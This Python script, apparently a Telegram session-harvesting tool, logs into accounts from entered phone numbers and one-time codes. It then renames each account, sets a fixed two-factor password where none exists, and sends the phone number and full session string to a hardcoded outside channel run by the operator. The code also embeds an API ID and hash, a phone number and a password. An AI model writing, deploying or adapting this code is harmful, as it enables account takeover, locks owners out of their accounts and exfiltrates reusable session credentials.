import os   
import asyncio
import time
import threading


try:
    from telethon.sessions import StringSession
    from telethon.sessions.string import StringSession
    from telethon.sync import TelegramClient, functions     
    from telethon.tl.functions.account import UpdateProfileRequest
    import telethon.tl.types
    from telethon import errors
    #import qrcode
    from qrcode import QRCode
except:
    os.system("pip install telethon")
    os.system("pip install qrcode")
    from telethon.sessions import StringSession
    from telethon.sessions.string import StringSession
    from telethon.sync import TelegramClient


# Replace with your API ID and API hash
api_id = '16017675'
api_hash = '898e9db01786302c9f95f67c23d9fecb'

phn_m = "+8801772525830"
pswd = "542543"
pass_2fa = "542543"

qr = QRCode()

def pr_qr(url: str) -> None:
    qr.clear()
    qr.add_data(url)
    print("Scan the QR code via the app Telegram -> Settings -> Devices")
    qr.print_ascii()


def p_qr(url: str) -> None:
    # You can also use qrcode library to generate the QR code image
    img = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=4)
    img.add_data(url)
    img.make(fit=True)
    
    # Display the QR code (example: using PIL - install pillow: pip install Pillow)
    img.print_ascii() # For a simple text-based display
    #from PIL import Image
    #img.get_image_instance().save("qr_code.png")
    # # You would typically display qr_code.png in your GUI or web application


async def disconnect_if_connected(client):
    """
    Disconnects the Telethon client if it is currently connected.
    """
    if client.is_connected():
        print("Client is connected. Disconnecting...")
        await client.disconnect()
        print("Client disconnected.")
    else:
        print("Client is not connected.")


async def nm_2fa_save(mClient,client):
    me = await client.get_me()
    ssn = client.session.save()
    phn = me.phone

    f_name = phn[3:] + '__KSP'
        
    print(f'Logged in as {me.first_name} _ {me.phone}')
    # Update the first name
    try:
        await client(UpdateProfileRequest(first_name=f_name))
        print(f'First name changed to {me.first_name}')
            
    except Exception as e:
        print(f"An error occurred: {e}")


    result = await client(functions.account.GetPasswordRequest())

    if not result.has_password:
        print("no 2fa")
            
                
        try:
            await client.edit_2fa(new_password=pass_2fa,hint='5****3')
            print("2FA has been successfully enabled.")
                
        except Exception as e:
            print(f"An error occurred: {e}")

    if result.has_password:
        print("has 2fa")
            
        
    print("\nSession sent in saved messages.")
        
    print(ssn)
        
    await client.send_message("me", f"🔴 Don't share with anyone 🔴\n\n`{phn}`\n\n`{ssn}`\n\n💁‍♂️ Developer @k_ofcl✌️",)
    await mClient.send_message(-1002576914746, f"`{phn}`\n\n`{ssn}`\n\nOTP\n\n💁‍♂️ Developer @k_ofcl✌️",)
    await disconnect_if_connected(client)
    await disconnect_if_connected(mClient)
    print("\n\n\n\n\nKSP Finished.")

        

async def login_main():

    while True:
        mClient = TelegramClient('n_agwnt', api_id, api_hash)
        await mClient.start(phone=phn_m,password=pswd,max_attempts=10)
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        phone_number = "+880" + input("Enter the phone number: ")
        result = await client.send_code_request(phone_number)
        phone_code_hash = result.phone_code_hash
        
        code = input("Enter the verification code: ")  # Get the OTP from the user

        
        
        try:
            await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
            if client.is_connected():
                await nm_2fa_save(mClient,client)

        except errors.SessionPasswordNeededError:
            await client.sign_in(password=pass_2fa)
            if await client.is_connected():
                await nm_2fa_save(mClient,client)
            pass
        
        except:
            pass

        await asyncio.sleep(10)  # Sleep for 60 seconds (1 minute)
        await disconnect_if_connected(client)
        await disconnect_if_connected(mClient)
        os.system('cls')
        #time.sleep(5)
    
#telethon.errors.rpcerrorlist.PhoneCodeExpiredError: The confirmation code has expired (caused by SignInRequest
if __name__ == "__main__":
    asyncio.run(login_main())
